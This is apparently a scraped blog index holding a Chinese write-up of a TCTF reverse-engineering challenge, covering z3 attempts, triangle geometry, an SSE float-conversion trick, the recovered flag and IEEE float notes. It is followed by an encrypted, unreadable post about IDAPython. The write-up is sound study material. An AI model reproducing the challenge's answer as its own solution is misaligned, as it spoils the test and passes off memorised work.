Real(&#39;x&#39;) y = Real(&#39;y&#39;) z = Real(&#39;z&#39;) m = Real(&#39;m&#39;) n = Real(&#39;n&#39;) p = Real(&#39;p&#39;) q = Real(&#39;q&#39;) solver = Solver() m = x*x+y*y-z*z n = (4.0*x*x*y*y-m*m)**0.5*0.25 p = 2*n/(x+y+z) + (-1.940035480806554296875E13) q = x*y*z/(4.0*n) + (-4.777053952827391e13) solver.add(z &gt; y) solver.add(y &gt; x) solver.add(x + y &gt; z) solver.add(p &gt; -100,p&lt;100) solver.add(q &gt; -100,q&lt;100) solver.add(x == 6.2791383142154e13) if solver.check() == sat: print(solver.model()) else: print(&#39;unsolve&#39;) 结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因 下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式 $$Rr=\\frac{abc}{2(a+b+c)}$$ $$tan\\frac{C}{2} = \\frac{2r}{a+b-c} = \\frac{sinC}{1+cosC}$$ 这里$sinC,cosC,R,r,c$都是已知的 所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$ 得到对应的浮点数表示4064e4798769,56e0de138176 movq xmm0, rax punpckldq xmm0, xmmword ptr cs:qword_400BD0 subpd xmm0, cs:xmmword_400BE0 pshufd xmm1, xmm0, 4Eh addpd xmm1, xmm0 movlpd [rsp+r14*8+168h+var_148], xmm1 在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊 qword_400BD0=0x4530000043300000 xmmword_400BE0=0x45300000000000004330000000000000 punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分 然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。 所以其实这里的变换等于没有变换。 所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176 最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176} 补充：浮点数表示、运算、指令浮点数有单精度和双精度之分，float占4个字节，double占8个字节 在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^sM2^E$ e等于向左或向右移动到1为止的个数 比如：12.25 对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$ 下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位） 符号位0，指数3，尾数10001(第一位默认为1不需要表示) 由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数 其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示10000000+11-1=10000010 最后12.15单精度浮点数表示为：0 10000010 10001000000000000000000 十六进制：0x41440000 内存中小端表示：00 00 44 41 Float/Double 符号位 指数 尾数 示例 16进制 Float 1位 8位 23位 0 10000010 10001000000000000000000 41440000 Double 1位 11位 52位 0 10000000010 1000100000000000000000000000 000000000000000000000000 4028800000000000 特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。 在线转换http://www.binaryconvert.com/ 浮点数在进行加减运算的时候需要先对阶然后尾数部分运算 浮点数指令查询https://asm.inightmare.org/opcodelst/index.php 这里解释下pshufd xmm1, xmm0, 4Eh指令 pshufd可以按照指定的方式重新排列数据 这里4E二进制01 00 11 10 寄存器 值 xmm0 42cc8d80 00000000 41e842c9 e1400000 4E 01 00 11 10 xmm1 41e842c9 e1400000 42cc8d80 00000000","tags":[{"name":"re","slug":"re","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"},{"name":"tctf","slug":"tctf","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"}]},{"title":"idapython learning note","date":"2019-03-07T11:42:24.000Z","path":"2019/03/07/idapython-learning-note/idapython-learning-note/","text":"Need password to decrypt! Incorrect Password! No content to display! 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